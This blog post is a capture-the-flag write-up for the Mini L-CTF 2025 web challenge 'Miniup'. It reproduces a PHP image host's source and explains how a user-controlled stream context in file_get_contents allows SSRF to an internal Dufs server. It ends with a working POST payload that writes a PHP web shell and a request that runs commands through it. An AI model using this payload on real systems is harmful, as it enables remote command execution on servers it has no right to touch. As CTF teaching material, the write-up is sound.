---
title: 'Mini L-CTF 2025 web Miniup'
categories:
  - 
tags: []
abbrlink: 6807feb9
date: 2026-03-03 22:06:12
---
# Mini L-CTF 2025 web Miniup

自主研发的图床（确信

---

没思路。查看源代码

这个源代码你直接index.php打开是不是看不到

其实你再上传图片的时候会发现图片上传后内容被编码成了base64

那你在查看图片那里输入路径：index.php

然后打开那张图片的链接，解码得到

```
$dufs_host = '127.0.0.1';
$dufs_port = '5000';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        $filename = $file['name'];

        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        
        $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        if (!in_array($file_extension, $allowed_extensions)) {
            echo json_encode(['success' => false, 'message' => '只允许上传图片文件']);
            exit;
        }
        
        $target_url = 'http://' . $dufs_host . ':' . $dufs_port . '/' . rawurlencode($filename);
        
        $file_content = file_get_contents($file['tmp_name']);
        
        $ch = curl_init($target_url);
        
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $file_content);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Origin: http://' . $dufs_host . ':' . $dufs_port,
            'Referer: http://' . $dufs_host . ':' . $dufs_port . '/',
            'Accept-Encoding: gzip, deflate',
            'Accept: */*',
            'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Content-Length: ' . strlen($file_content)
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            echo json_encode(['success' => true, 'message' => '图片上传成功']);
        } else {
            echo json_encode(['success' => false, 'message' => '图片上传失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '未选择图片']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'search') {
    if (isset($_POST['query']) && !empty($_POST['query'])) {
        $search_query = $_POST['query'];
        
        if (!ctype_alnum($search_query)) {
            echo json_encode(['success' => false, 'message' => '只允许输入数字和字母']);
            exit;
        }
        
        $search_url = 'http://' . $dufs_host . ':' . $dufs_port . '/?q=' . urlencode($search_query) . '&json';
        
        $ch = curl_init($search_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Accept: */*',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            $response_data = json_decode($response, true);
            if (isset($response_data['paths']) && is_array($response_data['paths'])) {
                $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
                
                $filtered_paths = [];
                foreach ($response_data['paths'] as $item) {
                    $file_name = $item['name'];
                    $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
                    
                    if (in_array($extension, $image_extensions) || ($item['path_type'] === 'Directory')) {
                        $filtered_paths[] = $item;
                    }
                }
                
                $response_data['paths'] = $filtered_paths;
                
                echo json_encode(['success' => true, 'result' => json_encode($response_data)]);
            } else {
                echo json_encode(['success' => true, 'result' => $response]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => '搜索失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入搜索关键词']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'view') {
    if (isset($_POST['filename']) && !empty($_POST['filename'])) {
        $filename = $_POST['filename'];
        
        $file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));	//利用点
        
        if ($file_content !== false) {
            $base64_image = base64_encode($file_content);
            $mime_type = 'image/jpeg';
            
            echo json_encode([
                'success' => true, 
                'is_image' => true,
                'base64_data' => 'data:' . $mime_type . ';base64,' . $base64_image
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => '无法获取图片']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入图片路径']);
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>迷你图片空间</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f0f8ff;
        }
        .section {
            margin-bottom: 30px;
            padding: 15px;
            border: 1px solid #add8e6;
            border-radius: 5px;
            background-color: white;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h2 {
            margin-top: 0;
            color: #4682b4;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #4682b4;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #add8e6;
            border-radius: 4px;
        }
        button {
            padding: 10px 15px;
            background-color: #4682b4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #5f9ea0;
        }
        .result {
            margin-top: 15px;
            padding: 10px;
            border: 1px solid #add8e6;
            border-radius: 4px;
            background-color: #f0f8ff;
            display: none;
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            background-color: #f5f5f5;
            padding: 10px;
            border-radius: 4px;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>迷你图片空间</h1>
    
    <div class="section">
        <h2>上传图片</h2>
        <form id="uploadForm" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <div class="form-group">
                <label for="file">选择图片：</label>
                <input type="file" id="file" name="file" required>
                <small>支持所有类型的图片</small>
            </div>
            <button type="submit">上传图片</button>
        </form>
        <div id="uploadResult" class="result"></div>
    </div>
    
    <div class="section">
        <h2>搜索图片</h2>
        <form id="searchForm">
            <input type="hidden" name="action" value="search">
            <div class="form-group">
                <label for="query">搜索关键词：</label>
                <input type="text" id="query" name="query" required 
                       pattern="[a-zA-Z0-9]+" 
                       title="只允许输入数字和字母"
                       placeholder="输入图片关键词（仅限数字和字母）">
            </div>
            <button type="submit">搜索</button>
        </form>
        <div id="searchResult" class="result">
            <h3>搜索结果：</h3>
            <div id="searchResultContent"></div>
        </div>
    </div>
    
    <div class="section">
        <h2>查看图片</h2>
        <form id="viewForm">
            <input type="hidden" name="action" value="view">
            <div class="form-group">
                <label for="filename">图片路径：</label>
                <input type="text" id="filename" name="filename" required placeholder="输入图片路径">
            </div>
            <button type="submit">查看图片</button>
        </form>
        <div id="viewResult" class="result">
            <h3>图片预览：</h3>
            <div id="fileContent"></div>
        </div>
    </div>
    
    <script>
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            
            fetch('index.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                var resultDiv = document.getElementById('uploadResult');
                resultDiv.style.display = 'block';
                resultDiv.innerHTML = data.message;
                resultDiv.style.color = data.success ? 'green' : 'red';
            })
            .catch(error => {
                var resultDiv = document.getElementById('uploadResult');
                resultDiv.style.display = 'block';
                resultDiv.innerHTML = '上传过程中发生错误';
                resultDiv.style.color = 'red';
            });
        });
        
        document.getElementById('searchForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var searchQuery = document.getElementById('query').value;
            
            var alphanumericRegex = /^[a-zA-Z0-9]+$/;
            if (!alphanumericRegex.test(searchQuery)) {
                var resultDiv = document.getElementById('searchResult');
                resultDiv.style.display = 'block';
                document.getElementById('searchResultContent').innerHTML = '<p style="color: red;">只允许输入数字和字母</p>';
                return;
            }
            
            var formData = new FormData(this);
            
            fetch('index.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                var resultDiv = document.getElementById('searchResult');
                resultDiv.style.display = 'block';
                
                if (data.success) {
                    try {
                        var jsonData = JSON.parse(data.result);
                        
                        if (jsonData.paths && jsonData.paths.length > 0) {
                            var resultHtml = '<table style="width:100%; border-collapse: collapse;">';
                            resultHtml += '<thead><tr style="background-color: #f2f2f2;">';
                            resultHtml += '<th style="text-align: left; padding: 8px; border: 1px solid #ddd;">名称</th>';
                            resultHtml += '<th style="text-align: left; padding: 8px; border: 1px solid #ddd;">修改时间</th>';
                            resultHtml += '<th style="text-align: left; padding: 8px; border: 1px solid #ddd;">大小</th>';
                            resultHtml += '<th style="text-align: left; padding: 8px; border: 1px solid #ddd;">操作</th>';
                            resultHtml += '</tr></thead><tbody>';
                            
                            jsonData.paths.forEach(function(item) {
                                var date = new Date(item.mtime);
                                var formattedDate = date.toLocaleString();
                                var fileSize = formatFileSize(item.size);
                                
                                resultHtml += '<tr style="border: 1px solid #ddd;">';
                                resultHtml += '<td style="padding: 8px; border: 1px solid #ddd;">' + item.name + '</td>';
                                resultHtml += '<td style="padding: 8px; border: 1px solid #ddd;">' + formattedDate + '</td>';
                                resultHtml += '<td style="padding: 8px; border: 1px solid #ddd;">' + fileSize + '</td>';
                                resultHtml += '<td style="padding: 8px; border: 1px solid #ddd;">';
                                resultHtml += '<button onclick="viewFile(\'' + item.name + '\')" style="margin-right: 5px;">查看</button>';
                                resultHtml += '</td></tr>';
                            });
                            
                            resultHtml += '</tbody></table>';
                            document.getElementById('searchResultContent').innerHTML = resultHtml;
                        } else {
                            document.getElementById('searchResultContent').innerHTML = '<p>没有找到匹配的图片</p>';
                        }
                    } catch (e) {
                        document.getElementById('searchResultContent').innerHTML = '<p>解析结果时出错</p>';
                    }
                } else {
                    document.getElementById('searchResultContent').innerHTML = '<p>错误: ' + data.message + '</p>';
                }
            })
            .catch(error => {
                var resultDiv = document.getElementById('searchResult');
                resultDiv.style.display = 'block';
                document.getElementById('searchResultContent').innerHTML = '<p>搜索过程中发生错误</p>';
            });
        });
        
        document.getElementById('viewForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            
            fetch('index.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                var resultDiv = document.getElementById('viewResult');
                resultDiv.style.display = 'block';
                
                if (data.success) {
                    var fileContentDiv = document.getElementById('fileContent');
                    fileContentDiv.textContent = ''; 

                    var img = document.createElement('img');
                    img.src = data.base64_data;
                    img.style.maxWidth = '100%';
                    img.style.display = 'block';
                    img.style.margin = '0 auto';
                    fileContentDiv.appendChild(img);
                } else {
                    document.getElementById('fileContent').textContent = '错误: ' + data.message;
                }
            })
            .catch(error => {
                console.error('错误:', error);
                var resultDiv = document.getElementById('viewResult');
                resultDiv.style.display = 'block';
                document.getElementById('fileContent').textContent = '获取图片时发生错误';
            });
        });

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function viewFile(filename) {
            document.getElementById('filename').value = filename;
            document.getElementById('viewForm').dispatchEvent(new Event('submit'));
        }
    </script>
</body>
</html>

```

漏洞点

```
        $file_content = @file_get_contents($filename,false,@stream_context_create($_POST['options']));
```



知识点：

`file_get_contents` 默认发起的是 **GET** 请求（从服务器取回数据）。

但当你通过 `stream_context_create` 控制第三个参数时，你可以重写这个请求：

1. **修改 Method**：将 `method` 设为 `PUT`。这告诉目标服务器（Dufs）：“我不是要下载，我是要**写入**”。
2. **设置 Content**：将 `content` 设为你的 WebShell 代码。这成为了 PUT 请求的**正文数据**。
3. **结果**：执行时，PHP 会向 `$filename` 发送一个带 Payload 的写入请求。Dufs 收到后，就会在指定路径创建一个包含你代码的文件。

->

**第一步：**  `$options` 直接由 `$_POST['options']` 传入。可以控制 HTTP 请求的 **所有元数据**（方法、报头、正文）。

**第二步**： `file_get_contents` 的第三个参数（context）可以改变请求的行为。通过设置 `method` 为 `PUT`，可以将原本的“下载”操作变成“上传”操作。

**第三步：** 既然能发任意请求，就要找内网中能写文件的服务。Dufs 刚好是一个通过 HTTP 协议管理文件的服务器，且支持 `PUT` 方法。



上下文

```
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'view') {
    if (isset($_POST['filename']) && !empty($_POST['filename'])) {
        $filename = $_POST['filename'];
        
        $file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));	//利用点
        
        if ($file_content !== false) {
            $base64_image = base64_encode($file_content);
            $mime_type = 'image/jpeg';
            
            echo json_encode([
                'success' => true, 
                'is_image' => true,
                'base64_data' => 'data:' . $mime_type . ';base64,' . $base64_image
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => '无法获取图片']);
        }
```



1.需要post

2.action要等与view



目标：

```
$options = [
    'http' => [
        'method' => 'PUT',
        'content' => '<?php system($_GET["a"]);?>'
    ]
];
```

payload（内存马）：

```
action=view&filename=http://127.0.0.1:5000/shell.php&options[http][method]=PUT&options[http][content]=<?php system($_GET['a']);?>

```

post上传内存马，然后打开

```
/shell.php?a=env
```



![image-20260303220339389](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260303220339389.png)